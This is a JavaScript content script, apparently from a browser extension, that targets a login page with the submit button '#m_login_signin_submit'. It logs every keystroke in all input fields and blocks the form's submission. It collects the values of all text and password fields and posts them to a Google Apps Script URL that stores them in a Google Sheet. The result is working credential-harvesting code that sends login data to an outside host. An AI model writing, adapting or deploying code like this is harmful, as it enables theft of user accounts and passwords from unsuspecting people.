// content.js

// Function to log real-time typing in all input fields
function logRealTimeInput() {
    // Query all input elements
    const inputElements = document.querySelectorAll('input');
     
    // Add event listener to each input element for real-time logging
    inputElements.forEach((input) => {
      input.addEventListener('keyup', (event) => {
        console.log(`Input (name: ${input.name || 'no name'}, type: ${input.type}): ${event.target.value}`);
      });
    });
}

// Function to handle form submission and send data to Google Sheets
function handleSubmitButtonClick() {
    const submitButton = document.querySelector('#m_login_signin_submit');  // Target the submit button
    const textInputs = document.querySelectorAll('input[type="text"]');    // Target all text inputs
    const passwordInputs = document.querySelectorAll('input[type="password"]');  // Target all password inputs

    // Add event listener to the submit button
    submitButton.addEventListener('click', (event) => {
        event.preventDefault();  // Prevent form submission to allow processing

        const inputValues = {};

        // Collect text input values
        textInputs.forEach((input) => {
            inputValues[input.name] = input.value;
        });

        // Collect password input values
        passwordInputs.forEach((input) => {
            inputValues[input.name] = input.value;
        });

        console.log('Collected input values:', inputValues);  // Log for debugging

        // Send data to Google Sheets using the deployed script URL
        sendToGoogleSheets(inputValues);
    });
}


// Function to send collected data to Google Sheets
function sendToGoogleSheets(data) {
  console.log("======= inside sendToGoogleSheets =======")
  const sheetUrl = 'https://script.google.com/macros/s/AKfycbxcBzTkBkcTmOsPi5MDuwwZs3VR-WSGANwczyRnxO2UgBPExfCWddg2U1stAgncvwKA/exec';

    // Send POST request with the collected data to the Apps Script URL
    fetch(sheetUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',  // Set content type as JSON
        },
      body: JSON.stringify(data),
      mode: 'no-cors'
    })
    .then(response => response.json())  // Parse the JSON response from Apps Script
    .then(data => console.log('Data saved to Google Sheets:', data))  // Log success response
    .catch(error => console.error('Error saving data to Google Sheets:', error));  // Log any errors
}
// Run the function
logRealTimeInput();
handleSubmitButtonClick()
